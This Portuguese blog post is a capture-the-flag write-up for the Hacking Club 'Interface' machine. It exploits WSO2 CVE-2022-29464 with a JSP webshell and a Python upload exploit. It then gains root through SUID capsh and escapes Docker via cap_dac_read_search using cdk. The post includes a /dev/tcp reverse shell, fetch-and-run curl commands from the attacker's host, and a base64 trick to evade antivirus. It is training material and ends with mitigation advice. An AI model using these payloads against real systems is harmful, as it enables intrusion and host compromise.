---
title: "Da CVE ao Host: explorando WSO2 (CVE-2022-29464), Capabilities e Docker Escape na máquina Interface do Hacking Club"
description: "WriteUp completo e didático da máquina Interface do Hacking Club: teoria e prática de upload irrestrito de arquivo no WSO2 API Manager (CVE-2022-29464), RCE via webshell JSP, escalação de privilégio com SUID no binário capsh e fuga de container Docker abusando da capability cap_dac_read_search."
author: matheus
date: 2026-06-07 18:00:00 -0300
last_modified_at: 2026-06-07 18:00:00 -0300
tags: ["CVE-2022-29464", "WSO2", "Capabilities", "Docker Escape", "Container Escape", "pentesting", "RCE", "WriteUps", "privilege escalation", "HackingClub", "cap_dac_read_search"]
categories: ["Segurança", "CTF e Writeups"]
pin: false
comments: true
math: true
image: /assets/img/covers/interface-wso2-docker-escape.png
---

## Quando o "corporativo" vira porta dos fundos

Existe um mito confortável (pela sensação humana) de que software "enterprise", caro e cheio de logo bonito, é seguro por natureza. A máquina **Interface** do Hacking Club existe justamente para enterrar esse mito. Aqui não tem um formulário caseiro mal feito: tem um produto de mercado, o **WSO2 API Manager**, rodando dentro de um **container Docker** — exatamente o tipo de stack que você encontra em produção de empresa grande.

O problema é que "produto de mercado" só é seguro se estiver **atualizado** e **bem configurado**. E essa máquina viola as duas coisas ao mesmo tempo: roda uma versão do WSO2 vulnerável a uma CVE crítica de upload de arquivo (a **CVE-2022-29464**) e, pior, o container foi subido com uma **capability perigosa sobrando** (`cap_dac_read_search`), que transforma uma invasão "presa dentro do container" em **leitura de qualquer arquivo do host**.

Neste guia a gente vai do zero ao host completo, sem pular raciocínio:

1. **Reconhecimento** — entender que serviço é esse e qual a versão.
2. **CVE-2022-29464** — entender *por que* um upload de arquivo vira execução remota de código (RCE) e explorar isso na unha.
3. **Enumeração de container** — descobrir que estamos presos dentro do Docker e o que temos à disposição.
4. **Escalação local** — virar root *dentro do container* abusando do binário SUID `capsh` (primeira flag).
5. **Docker Escape** — abusar da capability `cap_dac_read_search` para escapar do container e ler a flag de root do **host** (flag final).

Como sempre, vamos começar pela teoria pra você não decorar comando, e sim **entender** o que está acontecendo. Quem entende, adapta para qualquer máquina.

> **Informações da máquina:**
> - IP do alvo: `172.16.10.99`
> - IP da VPN (atacante): `10.0.30.175`
> - Tags: `CVE-2022-29464`, `Capabilities`, `Docker Escape`
> - Flags: 2 (root do container + root do host)
{: .prompt-info }

---

## Teoria 1: O que é o WSO2 API Manager

O **WSO2 API Manager** é uma plataforma open-source corporativa para **gerenciamento de APIs**: ela cria, publica, versiona, aplica políticas de segurança e monitora APIs. Pensa nela como o "porteiro e recepcionista" das APIs de uma empresa — todo mundo que quer falar com os serviços internos passa por ela.

Por baixo dos panos, o WSO2 roda em cima do **WSO2 Carbon** (um runtime Java/OSGi) e usa o **Apache Synapse** como motor de mediação. Isso explica as portas que vamos ver no scan:

- **9443** → console de administração / publisher (WSO2 Carbon, HTTPS).
- **8243** → gateway de APIs (Synapse, HTTPS).

E por ser um produto conhecido e versionável, basta a gente descobrir a **versão** para procurar CVEs públicas. Spoiler: tem uma bem famosa.

## Teoria 2: A anatomia da CVE-2022-29464

A **CVE-2022-29464** é uma vulnerabilidade crítica (CVSS 9.8) que afeta vários produtos WSO2 (incluindo o API Manager 4.0.0). Ela combina **duas falhas clássicas** que, juntas, dão execução remota de código **sem autenticação**:

### Falha 1: Upload de arquivo irrestrito (Unrestricted File Upload)

O endpoint `/fileupload/toolsAny` aceita upload de arquivos **sem validar o tipo/extensão**. Em uma aplicação saudável, se você manda um `.jsp`, `.php`, `.exe`, etc., o servidor deveria recusar. Aqui ele aceita qualquer coisa.

### Falha 2: Path Traversal no nome do arquivo

Sozinho, um upload irrestrito ainda precisaria que o arquivo caísse num lugar **executável** pela aplicação. É aqui que entra a segunda falha: o WSO2 **não sanitiza o nome do arquivo**, então a gente pode colocar `../../../` (path traversal / directory traversal) no nome para "subir de diretório" e gravar o arquivo onde a gente quiser.

Pensa no servidor como um prédio. O upload normal joga seu arquivo numa salinha de bagunça no porão (`tmp`), de onde ninguém consegue executar nada. O `../../../` é como pegar o elevador e escolher o **andar** onde o arquivo vai parar. A gente escolhe um andar "nobre": uma pasta de **webapp** que o servidor serve e **executa**.

O alvo perfeito é o webapp `authenticationendpoint`, que é servido publicamente. Mandando o arquivo para:

```
../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp
```

...ele passa a estar acessível (e executável!) em:

```
https://alvo:9443/authenticationendpoint/cmd.jsp
```

### Por que um .jsp vira "shell"?

Porque o WSO2 roda em **Java**, e um arquivo `.jsp` (JavaServer Pages) é **código Java que o servidor compila e executa** ao ser acessado. É o equivalente Java do `.php` num servidor PHP. Então se a gente subir um `.jsp` que executa comandos do sistema operacional, criamos uma **webshell**: uma porta de comando dentro do navegador.

> **Resumo da CVE:** upload sem validação (falha 1) + nome de arquivo sem sanitização permitindo `../` (falha 2) = eu escolho **o quê** subir e **onde** subir. Subindo um `.jsp` numa pasta executável = **RCE não autenticado**.
{: .prompt-info }

## Teoria 3: Containers, Docker e por que "root" pode não ser root

Spoiler do que vamos encontrar: o WSO2 roda dentro de um **container Docker**. E entender container é essencial pra fechar a máquina, então vamos por partes.

Um **container** não é uma máquina virtual. Ele compartilha o **mesmo kernel** do host (a máquina física/VM que o hospeda), mas o kernel usa dois mecanismos pra dar a ilusão de isolamento:

- **Namespaces**: criam "universos paralelos" para o processo. O container tem seu próprio namespace de processos (ele só enxerga os processos dele), de rede, de pontos de montagem (mounts), de hostname, etc. Por isso lá dentro o `hostname` é um ID aleatório tipo `fec05609f0fc` e o `ls /` mostra um sistema de arquivos "próprio".
- **Cgroups**: limitam recursos (CPU, memória).
- **Capabilities**: limitam o que o "root" do container pode fazer no kernel (já já a gente aprofunda).

Como saber se estamos num container? O sinal clássico é o arquivo **`/.dockerenv`** na raiz — ele é criado pelo Docker dentro de todo container. Outro sinal é o `/proc/mounts` mostrando um sistema de arquivos **`overlay`** (o overlayfs, que o Docker usa pra montar as camadas da imagem).

E aqui vem o conceito mais importante da máquina:

> **Ser root DENTRO do container ≠ ser root NO host.** O root do container é um root "de mentira", confinado pelos namespaces e pelas capabilities. Ele manda no universo paralelo dele, mas (em teoria) não enxerga nem toca os arquivos do host.
{: .prompt-warning }

A flag do container e a flag do host são **arquivos diferentes**, em **sistemas de arquivos diferentes**. Pegar a primeira é escalação local *dentro* da caixa. Pegar a segunda é **escapar da caixa**.

## Teoria 4: Capabilities do Linux — o "root fatiado"

Historicamente, no Linux era tudo ou nada: ou você era `root` (UID 0) e podia tudo, ou era um usuário comum e não podia quase nada. Isso é perigoso, porque um processo que só precisava abrir uma porta baixa (tipo um servidor web na porta 80) tinha que rodar como root **inteiro**, e se fosse comprometido, o atacante ganhava tudo.

As **capabilities** quebram o poder do root em "fatias" independentes. Em vez de "pode tudo", o kernel passa a perguntar "esse processo tem a *capability X* pra fazer essa ação específica?". Alguns exemplos:

- `cap_net_bind_service` → pode abrir portas abaixo de 1024.
- `cap_net_raw` → pode mandar pacotes raw (tipo `ping`).
- `cap_setuid` / `cap_setgid` → pode mudar de UID/GID.
- `cap_dac_override` → ignora **escrita/leitura/execução** baseada em permissões (DAC).
- `cap_dac_read_search` → **ignora as verificações de permissão de LEITURA de arquivos e de leitura/execução de diretórios.**

Containers Docker, por padrão, **dropam** quase todas as capabilities perigosas justamente pra que o root do container seja inofensivo. O problema da máquina Interface é que ela mantém a **`cap_dac_read_search`** no container — e essa, como veremos, é a chave que abre a porta do host.

### SUID, o primo das capabilities

Ainda no mundo de permissões, tem o bit **SUID (Set User ID)**. Um binário com SUID **executa com as permissões do DONO do arquivo**, não de quem executou. Se um binário pertence ao root e está com SUID ligado, qualquer usuário que o rodar terá, durante a execução, privilégios de root.

Isso é normal e necessário em alguns casos (o `passwd`, por exemplo, precisa escrever no `/etc/shadow`, que é só de root). O perigo é quando um binário SUID **não-essencial** consegue ser abusado pra te dar um shell. O site [GTFOBins](https://gtfobins.github.io/) cataloga exatamente isso. Vamos achar um binário SUID que é uma mina de ouro: o `capsh`.

---

## A Máquina Interface — WriteUp Completo

Chega de teoria pura. Bora aplicar tudo, do reconhecimento até o root do host, mostrando a saída real de cada etapa.

### Fase 1: Reconhecimento e Enumeração

Como sempre, a regra de ouro: **não começamos atacando, começamos observando.** O primeiro passo é descobrir o que a máquina expõe. Rodamos o **Nmap**:

```bash
nmap -sV -Pn -p- --min-rate 1000 172.16.10.99
```

Explicando os parâmetros:
- `-sV` = detecta a **versão** dos serviços (essencial, porque vamos caçar CVE por versão).
- `-Pn` = não faz ping antes do scan (útil quando o ICMP está bloqueado, e evita falso "host down").
- `-p-` = escaneia **todas** as 65535 portas (não só as 1000 mais comuns). Em CTF e pentest, sempre vale o scan completo: serviços interessantes costumam se esconder em portas altas.
- `--min-rate 1000` = acelera mandando no mínimo 1000 pacotes por segundo.

**Resultado do scan:**

```
PORT     STATE  SERVICE             VERSION
22/tcp   open   ssh                 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   closed http
8243/tcp open   ssl/synapse-nhttps?
9443/tcp open   ssl/tungsten-https?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Três portas relevantes:
- **22** → SSH (sem credenciais, é só um beco por enquanto).
- **8243** → HTTPS com a "cara" de Synapse.
- **9443** → HTTPS, o console do WSO2.

O Nmap não bateu o martelo no nome do serviço (mostrou `synapse-nhttps?` e `tungsten-https?` com `?`), mas o *fingerprint* que ele coletou entrega o jogo. Olhando a resposta bruta da porta **8243**, aparece um HTML revelador:

```html
<html xmlns="http://ws.apache.org/ns/synapse"><body><H1>Welcome to APIM</H1>...
```

E a resposta da porta **9443** entrega ainda mais — um redirecionamento (302) com um cabeçalho `Server` e, principalmente, um `Location` que **vaza o hostname interno**:

```
HTTP/1.1 302
Location: https://api-manager.hackingclub.local:9443/publisher/
Server: WSO2 Carbon Server
```

Duas informações de ouro aqui:
1. É um **WSO2 Carbon Server / APIM** (API Manager).
2. O hostname interno é **`api-manager.hackingclub.local`**.

> **Dica de recon:** sempre leia os cabeçalhos de resposta e os redirects. Um simples `Location:` num 302 acabou de nos dar o nome de domínio interno que o servidor espera. Isso costuma ser necessário pra UI funcionar direito no navegador.

**Mapeando o hostname (para a UI no navegador):**

Pra navegar na interface web do WSO2 pelo navegador, mapeamos o IP para o hostname no nosso `/etc/hosts` (no Linux) ou `C:\Windows\System32\drivers\etc\hosts` (no Windows):

```
172.16.10.99    api-manager.hackingclub.local
```

> Para o **exploit** em si, dá pra mirar direto no IP usando `-k` (ignorar certificado TLS), então o hosts é mais pra conveniência de navegação/SNI. Eu explorei batendo direto no IP.

**Descobrindo a versão exata do WSO2:**

O WSO2 expõe um web service de versão. Basta acessar `/services/Version`:

```bash
curl -sk https://172.16.10.99:9443/services/Version
```

```xml
<ns:getVersionResponse xmlns:ns="http://version.services.core.carbon.wso2.org">
  <return>WSO2 API Manager-4.0.0</return>
</ns:getVersionResponse>
```

**WSO2 API Manager 4.0.0.** Com a versão na mão, uma busca rápida nos leva direto à **CVE-2022-29464**. Bingo.

### Fase 2: Explorando a CVE-2022-29464 (RCE via Webshell JSP)

Lembra da teoria? Vamos transformar o upload irrestrito + path traversal numa webshell.

**O payload (a webshell JSP):**

Nossa webshell é um `.jsp` mínimo que pega o parâmetro `cmd` da URL e executa no sistema operacional, devolvendo a saída na própria página:

```jsp
<%@ page import="java.io.*" %><%
String c = request.getParameter("cmd");
if (c != null) {
  ProcessBuilder pb = new ProcessBuilder("/bin/bash","-c",c);
  pb.redirectErrorStream(true);
  Process p = pb.start();
  BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l; while((l=b.readLine())!=null){ out.println(l); }
}
%>
```

Detalhe importante: usei `ProcessBuilder("/bin/bash","-c", c)` em vez de só `Runtime.exec(c)`. Isso faz o comando ser interpretado por um **shell bash de verdade**, então pipes (`|`), redirecionamentos (`2>/dev/null`), `&&` e variáveis funcionam normalmente. O `redirectErrorStream(true)` junta `stderr` e `stdout` pra gente ver erros também.

**O exploit (o upload com path traversal):**

A exploração é um `POST` multipart para `/fileupload/toolsAny`, onde o **nome do campo** carrega o path traversal apontando para o webapp `authenticationendpoint`. Existe o exploit público do [hakivvi](https://github.com/hakivvi/CVE-2022-29464), mas eu preferi montar o request na mão (em Python puro, só com a `stdlib`) para ter controle total — e, de quebra, **sem gravar o `.jsp`/`.py` em disco** (rodei via *stdin*, o que evita que antivírus apaguem o arquivo, um detalhe prático de quem usa Windows como base):

```python
import ssl, urllib.request, urllib.error
host  = "https://172.16.10.99:9443"
fname = "cmd.jsp"
jsp   = '<JSP da webshell acima>'

boundary = "----wso2upload2929464"
body = (
  "--" + boundary + "\r\n"
  'Content-Disposition: form-data; '
  'name="../../../../repository/deployment/server/webapps/authenticationendpoint/' + fname + '"; '
  'filename="' + fname + '"\r\n'
  "Content-Type: application/octet-stream\r\n\r\n"
  + jsp + "\r\n"
  "--" + boundary + "--\r\n"
).encode()

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
req = urllib.request.Request(host + "/fileupload/toolsAny", data=body, method="POST",
      headers={"Content-Type": "multipart/form-data; boundary=" + boundary})
print(urllib.request.urlopen(req, context=ctx, timeout=25).status)
```

O coração de tudo está nesta linha:

```
name="../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp"
```

Os `../../../../` sobem do diretório de upload temporário até a raiz do WSO2, e daí descemos para a pasta do webapp `authenticationendpoint`, gravando ali nosso `cmd.jsp`.

**Resultado do upload:**

```
UPLOAD HTTP 200
shell @ https://172.16.10.99:9443/authenticationendpoint/cmd.jsp
```

**Testando a webshell:**

```bash
curl -sk "https://172.16.10.99:9443/authenticationendpoint/cmd.jsp?cmd=id"
```

```
uid=802(wso2carbon) gid=802(wso2) groups=802(wso2)
```

**RCE confirmado!** Estamos executando comandos como o usuário **`wso2carbon`** (UID 802). A partir daqui, o "navegador é nosso terminal".

> A partir desse ponto, eu uso a webshell como interface de comando: cada `?cmd=<comando>` roda no servidor e devolve a saída. Funciona perfeitamente pra tudo que vamos precisar (inclusive virar root, como você vai ver).

### Fase 3: Enumeração — "espera, eu estou dentro de um container?"

Antes de sair escalando, a gente enumera o terreno. Rodando alguns comandos pela webshell:

```bash
# uid e hostname
?cmd=id; whoami; hostname
```
```
uid=802(wso2carbon) gid=802(wso2) groups=802(wso2)
wso2carbon
fec05609f0fc
```

O hostname `fec05609f0fc` (12 caracteres hex aleatórios) já cheira a **ID de container Docker**. Vamos confirmar olhando a raiz:

```bash
?cmd=ls -la /
```
```
drwxr-xr-x   1 root root 4096 Apr 29  2022 .
-rwxr-xr-x   1 root root    0 Apr 29  2022 .dockerenv      <-- PROVA!
drwxr-xr-x   1 root root 4096 Apr 29  2022 etc
...
drwx------   1 root root 4096 Apr 29  2022 root           <-- /root existe, mas...
```

O arquivo **`/.dockerenv`** confirma: **estamos dentro de um container Docker.** E o `/proc/mounts` reforça, mostrando o overlayfs:

```
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/...,upperdir=/var/lib/docker/overlay2/.../diff,workdir=...
```

Mais contexto do sistema:

```bash
?cmd=uname -a
```
```
Linux fec05609f0fc 5.4.0-1060-aws #63~18.04.1-Ubuntu SMP ... x86_64 GNU/Linux
```
```bash
?cmd=cat /etc/os-release | head -5
```
```
NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
PRETTY_NAME="Ubuntu 20.04.4 LTS"
```

Tentamos ler o `/root` (onde provavelmente está a primeira flag):

```bash
?cmd=ls -la /root
```
```
ls: cannot open directory '/root': Permission denied
```

Negado — somos `wso2carbon`, não root. Precisamos escalar. Hora de procurar vetores.

**Caça a binários SUID:**

```bash
?cmd=find / -perm -4000 -type f 2>/dev/null
```
```
/usr/sbin/capsh
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
```

Recapitulando o comando:
- `find /` percorre tudo a partir da raiz.
- `-perm -4000` filtra **apenas** arquivos com o bit **SUID** ligado.
- `-type f` restringe a arquivos regulares.
- `2>/dev/null` joga fora as mensagens de erro (de pastas sem permissão), deixando a saída limpa.

A maioria dessa lista é padrão e esperada (`passwd`, `su`, `mount`...). Mas um chama atenção por **não** ser comum como SUID: o **`/usr/sbin/capsh`**. Isso é o nosso bilhete premiado.

**Olhando as capabilities do container:**

```bash
?cmd=capsh --print
```
```
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,
cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,
cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,...,cap_setfcap
```

Repare na presença da **`cap_dac_read_search`** no conjunto de capabilities do container. Guarda essa informação com muito carinho — ela é a chave da fuga do container na fase final. Mas primeiro, a primeira flag.

### Fase 4: Escalação Local — Root dentro do container via SUID `capsh`

O binário **`capsh`** ("capability shell wrapper") serve pra inspecionar e ajustar capabilities e, no caminho, **spawnar um shell**. O [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/#suid) documenta o abuso clássico: se o `capsh` tem o bit **SUID** ligado (e tem!), ele **não dropa os privilégios elevados** ao spawnar o shell. Ou seja, ele nos entrega um shell **root**.

O comando do GTFOBins, em um terminal interativo, é:

```bash
capsh --gid=0 --uid=0 --
```

O `--gid=0 --uid=0` pede para rodar com GID/UID 0 (root), e o `--` final diz "acabaram as opções, agora me dá um shell". Como o `capsh` é SUID root, ele consegue fazer isso de fato.

Como eu estava operando pela webshell (não-interativa), usei a forma equivalente que **executa um comando** em vez de abrir um shell interativo:

```bash
capsh --gid=0 --uid=0 -- -c '<comando aqui>'
```

O `-- -c '...'` repassa o `-c '...'` para o `/bin/bash` que o `capsh` spawna — e esse bash já nasce como root. Confirmando:

```bash
?cmd=capsh --gid=0 --uid=0 -- -c 'id; hostname'
```
```
uid=0(root) gid=0(root) groups=0(root)
fec05609f0fc
```

**Somos root dentro do container!** Agora o `/root` abre:

```bash
?cmd=capsh --gid=0 --uid=0 -- -c 'ls -la /root'
```
```
drwx------ 1 root root 4096 Apr 29  2022 .
-rw-r--r-- 1 root root   46 Apr 29  2022 flag.txt
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw-r--r-- 1 root root  165 Apr 29  2022 .wget-hsts
```

E a primeira flag:

```bash
?cmd=capsh --gid=0 --uid=0 -- -c 'cat /root/flag.txt'
```

> **Flag 1 (root do container):** `hackingclub{d8cf885ad3e48dfadb18da8310c25761}`
{: .prompt-tip }

### Fase 5: Reverse Shell e TTY (a abordagem clássica)

Pequeno parêntese sobre conforto. A webshell resolve tudo nesta máquina, mas em cenários reais você vai querer um **shell interativo** de verdade (pra usar `vim`, `sudo`, autocomplete, `Ctrl+C` sem matar a sessão, etc.). A forma clássica é uma **reverse shell**: fazer o alvo se conectar **de volta** pra você.

Na sua máquina atacante, você abre um ouvinte (`netcat`/`ncat`):

```bash
nc -lvnp 4444
```

E dispara a conexão reversa pela webshell. Um one-liner que não depende de ferramenta externa é o `/dev/tcp` do bash:

```bash
?cmd=bash -c 'bash -i >& /dev/tcp/10.0.30.175/4444 0>&1'
```

Recebida a conexão, o upgrade para um **TTY/PTY** decente é o ritual de sempre:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # spawna um pseudo-terminal
# Ctrl+Z (joga pra background)
stty raw -echo; fg                               # repassa o input cru pro shell remoto
# Enter, Enter
export TERM=xterm                                # habilita clear/vim/cores
```

> Se você quiser o aprofundamento completo de **TTY vs PTY**, `stty raw -echo` e por que esse upgrade funciona, eu destrinchei isso em detalhe no meu writeup da máquina **Lion** — aqui não vou repetir pra não inflar o texto.

**Transparência total:** nesta resolução, toda a execução de comando (inclusive o root via `capsh`) foi feita pela **webshell**, que já era suficiente e estável. A reverse shell fica documentada aqui como o método padrão/recomendado em engajamentos reais.

### Fase 6: Descobrindo o vetor de fuga — a capability `cap_dac_read_search`

Somos root no container, mas a flag final está no `/root/` do **host**, fora do nosso alcance "normal". Precisamos **escapar do container**.

Já vimos no `capsh --print` que o container tem a `cap_dac_read_search`. Para confirmar de forma automatizada (e mostrar o vetor de forma cristalina), dá pra usar o **deepce** (*Docker Enumeration, Escalation of Privileges and Container Escapes*), que enumera justamente fraquezas de container:

```bash
# Como não há saída pra internet no alvo, eu sirvo a ferramenta da minha máquina
# (HTTP server no IP da VPN) e puxo pelo curl no alvo.
?cmd=cd /tmp && curl -s http://10.0.30.175:8000/deepce.sh -o d.sh && chmod +x d.sh && ./d.sh
```

Trecho relevante da saída do deepce:

```
==============================( Enumerating Container )==============================
[+] Dangerous Capabilities .. Yes
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,...,cap_setfcap+eip
[+] Privileged Mode ......... No
[+] Docker sock mounted ....... No
```

Tradução do diagnóstico:
- **Privileged Mode: No** → o container **não** está em modo privilegiado (esse seria o escape fácil).
- **Docker sock mounted: No** → o `docker.sock` não está montado (outro escape clássico que não está disponível aqui).
- **Dangerous Capabilities: Yes → `cap_dac_read_search`** → **é por aqui.**

> O deepce é opcional: a descoberta já estava feita manualmente com `capsh --print`. Mostro a saída dele só para evidenciar o vetor de forma incontestável. Se você não quiser usar a ferramenta, o `capsh --print` (ou `cat /proc/self/status | grep Cap` + decodificar com `capsh --decode=`) entrega a mesma informação.

**Por que `cap_dac_read_search` permite escapar?**

A página de manual define a capability assim:

> **CAP_DAC_READ_SEARCH:** ignora as verificações de permissão de **leitura** de arquivos e as verificações de permissão de **leitura e execução** de diretórios.

Sozinha, ela "só" deixa ler qualquer arquivo — mas dentro do namespace de mount do container. O pulo do gato é combiná-la com a syscall **`open_by_handle_at()`**.

Diferente do `open()` (que abre arquivos por **caminho**, respeitando o namespace de mount do container), o `open_by_handle_at()` abre arquivos por um **handle** que referencia diretamente o **inode** no dispositivo de bloco subjacente. Como o container compartilha o **mesmo disco** do host (o overlayfs vive em `/var/lib/docker/` no host), se a gente conseguir adivinhar o handle de um inode do **host**, conseguimos lê-lo — atravessando a fronteira do container.

Normalmente o kernel barraria isso por falta de permissão, mas a `cap_dac_read_search` é exatamente a capability que **ignora essa verificação**. O resultado: conseguimos **ler arquivos arbitrários do host** a partir de dentro do container. Essa técnica é o famoso **"Shocker"** de fuga de container, e é o que a ferramenta `cdk` implementa no módulo `cap-dac-read-search` (ela faz força bruta nos números de inode partindo de uma referência conhecida, tipicamente `/etc/hostname`).

### Fase 7: Docker Escape com `cdk` — lendo o `/root/root.txt` do host

O **CDK** (*Container DucK / Zero Dependency Container Penetration Toolkit*) é um canivete suíço de fuga e ataque a containers, distribuído como um binário Go estático (zero dependências). Ele tem um módulo pronto pra explorar a `cap_dac_read_search`.

**O desafio da transferência:** o alvo **não tem saída pra internet** (testei: `curl https://github.com` retorna código `000`). Mas ele alcança a **minha** máquina pela VPN. Então sirvo o binário a partir do meu IP de VPN e puxo de lá.

Aqui entra um truque prático que vale anotar: o binário do `cdk` é uma ferramenta de pentest conhecida, então o **antivírus da minha máquina apagaria o arquivo** na hora. Para contornar, baixei o `cdk` **canalizando direto para base64** (o ELF nunca toca o disco como executável; vira **texto**, que não dispara assinatura de ELF) e servi o `.b64`:

```bash
# Na máquina atacante: baixar o cdk já convertendo pra base64 (texto)
curl -sL https://github.com/cdk-team/CDK/releases/download/v1.5.6/cdk_linux_amd64 \
  | base64 | tr -d '\n' > cdk.b64

# Servir o diretório no IP da VPN
python3 -m http.server 8000 --bind 10.0.30.175
```

No alvo, puxamos o `.b64`, **decodificamos de volta para binário**, damos permissão de execução e rodamos o módulo de escape — tudo como **root** (via `capsh`), porque a `cap_dac_read_search` precisa estar no conjunto **efetivo** do processo, e é como root que ela está ativa:

```bash
?cmd=capsh --gid=0 --uid=0 -- -c 'cd /tmp \
  && curl -s http://10.0.30.175:8000/cdk.b64 | base64 -d > /tmp/.cdk \
  && chmod +x /tmp/.cdk \
  && /tmp/.cdk run cap-dac-read-search /root/root.txt'
```

**Resultado:**

```
uid=0(root) gid=0(root) groups=0(root)
---
Running with target: /root/root.txt, ref: /etc/hostname
hackingclub{8c823ea11f5381be9d83f76517e2c123}
```

Repare no `ref: /etc/hostname`: o `cdk` usou esse arquivo conhecido como ponto de partida pra resolver o file handle e, daí, alcançar o `/root/root.txt` do **host**. **Fuga de container concluída** — estamos lendo o sistema de arquivos do hospedeiro.

> **Flag 2 (root do host):** `hackingclub{8c823ea11f5381be9d83f76517e2c123}`
{: .prompt-tip }

E, de fato, as duas flags são **diferentes**: uma é o `/root/flag.txt` de dentro do container, a outra é o `/root/root.txt` do host — provando concretamente que cruzamos a fronteira da caixa.

---

## Resumo do ataque

1. **Recon** — `nmap` revela WSO2 (portas 9443/8243) e o `/services/Version` confirma **WSO2 API Manager 4.0.0**.
2. **CVE-2022-29464** — upload irrestrito + path traversal em `/fileupload/toolsAny` grava uma webshell `.jsp` no webapp `authenticationendpoint` → **RCE não autenticado** como `wso2carbon`.
3. **Enumeração** — `/.dockerenv` + overlayfs confirmam **container Docker**; `find -perm -4000` revela o SUID **`capsh`**; `capsh --print` revela a capability **`cap_dac_read_search`**.
4. **Escalação local** — abuso do SUID `capsh` (`capsh --gid=0 --uid=0 --`) → **root no container** → **Flag 1**: `hackingclub{d8cf885ad3e48dfadb18da8310c25761}`.
5. **Docker Escape** — `cap_dac_read_search` + `open_by_handle_at` (técnica Shocker, via `cdk run cap-dac-read-search`) → **leitura do `/root/root.txt` do host** → **Flag 2**: `hackingclub{8c823ea11f5381be9d83f76517e2c123}`.

Duas lições que a Interface ensina:
- **Software "enterprise" desatualizado é tão letal quanto código caseiro ruim.** Uma CVE pública em produto conhecido é um convite.
- **Capabilities sobrando = isolamento de container quebrado.** O Docker dropa caps perigosas por padrão *por um motivo*. Manter `cap_dac_read_search` (ou rodar `--privileged`, ou montar o `docker.sock`) transforma "comprometimento de um serviço" em "comprometimento do host inteiro".

## Recomendações de mitigação (o lado defensivo)

- **Atualizar o WSO2** para uma versão corrigida da CVE-2022-29464 (e, em geral, manter o patch management em dia).
- **Não expor** consoles administrativos (9443) para redes não confiáveis; segmentar.
- **Dropar capabilities**: subir containers com `--cap-drop=ALL` e adicionar de volta **somente** o estritamente necessário. Nunca deixar `cap_dac_read_search`/`cap_dac_override`/`cap_sys_admin` sem necessidade real.
- **Não usar `--privileged`** e não montar o `docker.sock` dentro de containers acessíveis pela aplicação.
- **Princípio do menor privilégio** também dentro do container: revisar binários **SUID** desnecessários (o `capsh` SUID não deveria estar ali).

---

## Referências e Recursos

- [CVE-2022-29464 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2022-29464)
- [Exploit público — hakivvi/CVE-2022-29464](https://github.com/hakivvi/CVE-2022-29464)
- [WSO2 Security Advisory — WSO2-2021-1738](https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2022/WSO2-2021-1738/)
- [GTFOBins — capsh (SUID)](https://gtfobins.github.io/gtfobins/capsh/#suid)
- [man capabilities(7) — CAP_DAC_READ_SEARCH](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [CDK — Zero Dependency Container Penetration Toolkit](https://github.com/cdk-team/CDK)
- [deepce — Docker Enumeration, Escalation of Privileges and Container Escapes](https://github.com/stealthcopter/deepce)
- [HackTricks — Docker Breakout / Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
- [HackingClub](https://hackingclub.com/) — plataforma com as máquinas práticas

---

>Algum erro ou problema na postagem? Deixe um comentário abaixo através da sua conta do github. Elogios e reações também serão bem vindas, hehe. Abração!!
